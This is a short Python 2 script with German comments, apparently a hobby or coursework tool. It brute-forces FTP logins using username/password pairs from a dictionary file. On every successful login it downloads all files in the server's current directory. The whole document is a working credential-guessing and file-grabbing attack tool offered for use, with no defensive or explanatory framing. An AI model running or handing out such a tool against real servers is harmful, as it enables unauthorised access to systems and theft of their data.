# -*- coding: iso-8859-1 -*-
# sucht nach logins und lädt dateien von diesen
# TODO: flexiblen Port ermöglichen; Ordner Rekursion
import ftputil
import argparse

# baut Verbindung zu FTP-Server auf und versucht sich mit Logins aus einer Datei einzuloggen
# @param hostname: str; IP des FTP-Servers
# @param dictFile: str; Datei mit potentiellen Benutzernamen und Passwörtern
# @return bool; Wahrheitswert, ob FTP erreicht wurde
def ftpLogin(hostname,dictFile):
    try:
        # liesst zeilenweise die Login-Datei aus und versucht sich mit jedem Login zu ftp zu verbinden
        for line in open(dictFile, "r").readlines():
            [username, password] = line.strip().split()

            try:
                print "[+] Trying to login with username: %s password: %s" % (username, password)
                # Login-Versuch
                ftp = ftputil.FTPHost(hostname, username, password)
                # Ausgabe wenn es funktioniert hat
                print('[*] ' + str(hostname) + ' FTP Logon Succeeded.\n')
                get_files(ftp)
            except:
                # Ausgabe falls Login nicht funktioniert hat
                print('[-] ' + str(hostname) + ' FTP Logon Failed.\n')

        # Verbindung hat funktioniert
        ftp.close()
        return True
    except:
        # Verbindung ist fehlgeschlagen
        print "Could not connect to FTP"
        return False

# Läd Dateien vom FTP-Ordner
# @param ftp: obj; Objekt der Klasse FTPHost
def get_files(ftp):
    dataList  = ftp.listdir(ftp.curdir)
    for data in dataList:
        try:
            if ftp.path.isfile(data):
                print "--> Downloading File %s\n" %data
                ftp.download(data,data)
            elif ftp.path.isdir(data):
                print "--> Could not download the Directory %s.\n" % data
        except:
            print "--> File could not be downloaded"


# definiert Host und Username/Password-Datei als Parameter
# übergibt Benutzereingaben an ftpLogin
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-H', dest='hostIP', \
                        type=str, help='specify the Host-IP', \
                        required=True)
    parser.add_argument('-f', dest='dictionaryFile', \
                        type=str, help='specify the Path of the Username/Password-File', \
                        required=True)
    args = parser.parse_args()
    ftpLogin(args.hostIP, args.dictionaryFile)

if __name__== '__main__':
    main()